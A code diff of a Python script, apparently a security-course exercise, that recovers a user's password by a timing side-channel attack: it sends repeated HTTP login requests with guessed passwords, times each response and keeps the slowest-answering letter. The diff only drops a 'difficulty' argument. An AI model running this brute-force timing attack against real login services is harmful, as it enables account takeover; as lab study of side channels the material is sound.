@@ -29,12 +29,11 @@ def eprint(*args, **kwargs):
     print(*args, file=sys.stderr, **kwargs)
 
 
-def try_to_hack(username, password, difficulty):
+def try_to_hack(username, password):
     """
     This function sends ATTEMPTS_PER_LETTER times requests to the server
     :param username: the username
     :param password: the current guessed password
-    :param difficulty: the difficulty level
     :return: list of all the RTTs took for each request
     """
     timings = []
@@ -42,7 +41,7 @@ def try_to_hack(username, password, difficulty):
     # Do #ATTEMPTS_PER_LETTER HTTP calls
     for _ in range(ATTEMPTS_PER_LETTER):
         before = time.perf_counter()
-        result = requests.get(URL, params={'user': username, 'password': password, 'difficulty': difficulty})
+        result = requests.get(URL, params={'user': username, 'password': password})
         after = time.perf_counter()
 
         # Raise the password immediately in case we discover it
@@ -54,13 +53,12 @@ def try_to_hack(username, password, difficulty):
     return timings
 
 
-def find_next_character(username, base_known_password, password_length, difficulty):
+def find_next_character(username, base_known_password, password_length):
     """
     Find the next character in the password from a base_known_password
     :param username: the username
     :param base_known_password: the current guessed password
     :param password_length: the password length
-    :param difficulty: the difficulty level
     :return: the next character in the password
     """
     measures = []  # statistics for each guess - min, max, median, stddev
@@ -69,7 +67,7 @@ def find_next_character(username, base_known_password, password_length, difficul
     (len(base_known_password) + 1), base_known_password))
     for _, character in enumerate(string.ascii_lowercase):
         next_guess_password = base_known_password + character + "0" * (password_length - len(base_known_password) - 1)
-        timings = try_to_hack(username, next_guess_password, difficulty)
+        timings = try_to_hack(username, next_guess_password)
 
         # Calculate the statistics
         median = statistics.median(timings)
@@ -134,14 +132,12 @@ def main():
     # Do a first request to start the keep-alive connection
     requests.get(URL)
 
-    if len(sys.argv) not in (2, 3):
-        print('\n'.join(["Usage: python3 ex01_M1.py [username]",
-                         "OR:    python3 ex01_M1.py [username] [difficulty]"]))
+    if len(sys.argv) != 2:
+        print("Usage: python3 ex01_M1.py [username]")
         sys.exit(1)
 
     start = time.time()
     username = sys.argv[1]
-    difficulty = sys.argv[2] if len(sys.argv) == 3 else 1
 
     # While not found
     while 1:
@@ -152,7 +148,7 @@ def main():
 
         try:
             while len(password) != password_length:
-                next_character = find_next_character(username, password, password_length, difficulty)
+                next_character = find_next_character(username, password, password_length)
                 password += next_character
 
         except PasswordFound as p:
